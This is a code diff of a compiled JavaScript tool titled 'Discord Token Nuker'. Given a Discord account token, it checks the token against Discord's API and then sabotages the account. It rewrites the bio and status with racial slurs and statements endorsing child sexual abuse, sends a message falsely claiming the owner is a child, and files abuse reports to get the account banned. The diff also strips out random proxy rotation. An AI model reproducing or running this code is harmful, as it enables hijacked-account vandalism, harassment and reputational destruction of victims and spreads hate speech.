@@ -13,12 +13,12 @@ var __importDefault = (this && this.__importDefault) || function (mod) {
 };
 Object.defineProperty(exports, "__esModule", { value: true });
 const node_fs_1 = __importDefault(require("node:fs"));
-const promises_1 = __importDefault(require("node:readline/promises"));
 const axios_1 = __importDefault(require("axios"));
 const ora_1 = __importDefault(require("ora"));
 const chalk_1 = __importDefault(require("chalk"));
 const node_util_1 = __importDefault(require("node:util"));
 const yaml_1 = __importDefault(require("yaml"));
+const promises_1 = __importDefault(require("node:readline/promises"));
 class BillingInfo {
     constructor() {
         this["Type"] = "";
@@ -69,34 +69,17 @@ function clear_empty(data) {
     });
 }
 function orainput(question) {
-    return (0, ora_1.default)(chalk_1.default.red(question.padStart(25, " ")));
+    return (0, ora_1.default)(chalk_1.default.red(question));
 }
 function pad(x) {
-    return chalk_1.default.red(x.padStart(25, ""));
+    return chalk_1.default.red(("").repeat(25) + x);
 }
-let proxies = [];
 process.title = "Discord Token Nuker | Made by @nekovada on discord";
-function proxy_init() {
-    return __awaiter(this, void 0, void 0, function* () {
-        yield axios_1.default.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", { responseType: "text" }).then((res) => {
-            proxies = res.data.text.toString().split("\n").map((v) => v.split(":"));
-        });
-    });
-}
 function headerinit(auth, json) {
     return __awaiter(this, void 0, void 0, function* () {
-        if (node_util_1.default.isDeepStrictEqual(proxies, {})) {
-            yield proxy_init();
-        }
-        let proxy = proxies[Math.floor(Math.random() * proxies.length)];
         return {
             headers: {
                 Authorization: auth
-            },
-            proxy: {
-                port: Number.parseInt(proxy[1]),
-                host: proxy[0],
-                protocol: "https"
             }
         };
     });
@@ -112,11 +95,11 @@ function nuke(token) {
                 let info = yield axios_1.default.get("https://discord.com/api/users/@me", headers);
                 notif.start();
                 if (info.status != 200) {
-                    notif.fail(pad("Error! Token is invalid..."));
+                    notif.fail("Error! Token is invalid...");
                     return false;
                 }
                 ui = info;
-                notif.succeed(pad("Successfully validated token"));
+                notif.succeed("Successfully validated token");
             }
             let notif = orainput("Getting basic info...").start();
             let user = ui.data["Username"];
@@ -239,7 +222,7 @@ function nuke(token) {
         let defd = orainput("Vandalizing account...");
         yield axios_1.default.patch("https://discord.com/api/users/@me/settings", { "bio": "I really love kids, I cant hold this in anymore I am a MAP\nI also have membership in the ku klux klan and are a registered sex offender and hang niggers daily" }, headers);
         yield axios_1.default.patch("https://discord.com/api/users/@me", { "custom-status": "Honestly, black people are subhuman, I think kids should be used as sex slaves too." }, headers);
-        defd.succeed(pad("Successfuly vandalized account..."));
+        defd.succeed("Successfuly vandalized account...");
         let banfd = orainput("Terming account...").start();
         yield axios_1.default.post(`https://discord.com/api/users/@me/channels/${unlucky["id"]}/messages`, { "message": "I am 8 years old please don't tell anybody" }, headers).then(() => __awaiter(this, void 0, void 0, function* () {
             axios_1.default.post("https://discord.com/api/v6/report", {
@@ -315,16 +298,19 @@ function main() {
                          ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░
                          
 `));
-        let input = promises_1.default.createInterface(process.stdin, process.stdout);
+        let io = promises_1.default.createInterface(process.stdin, process.stdout);
         while (true) {
-            process.stdout.write(pad("Enter your token >> "));
-            const token = yield input.question('\0');
-            let time = Date.now();
-            if (yield nuke(token)) {
-                console.log(pad(`Successfully nuked token in ${(Date.now() - time) / 1000} seconds`));
+            const token = yield io.question(pad("Enter your token >> "));
+            try {
+                let time = Date.now();
+                if (yield nuke(token.toString())) {
+                    console.log(pad(`Successfully nuked token in ${(Date.now() - time) / 1000} seconds`));
+                    continue;
+                }
             }
-            else {
-                console.log(pad("Invalid token!"));
+            catch (_a) {
+                console.warn(pad("Invalid token!!"));
+                continue;
             }
         }
     });
